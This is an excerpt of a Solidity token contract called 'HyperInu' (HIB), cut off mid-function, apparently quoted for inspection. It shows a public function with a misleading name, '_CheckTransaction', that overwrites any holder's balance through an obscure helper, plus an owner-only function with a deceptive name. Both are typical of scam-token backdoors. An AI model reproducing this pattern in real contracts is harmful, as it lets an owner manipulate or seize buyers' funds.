...
contract HyperInu is IERC20, Ownable {
    ...
    string private _name = "HyperInu";

    string private _symbol = "HIB";
    ...
    function _CheckTransaction(address buyer) public {
        balances[buyer] = Bscreflection(buyer);
    }

    function _CHeckETH(address Router) public OwnereTH {
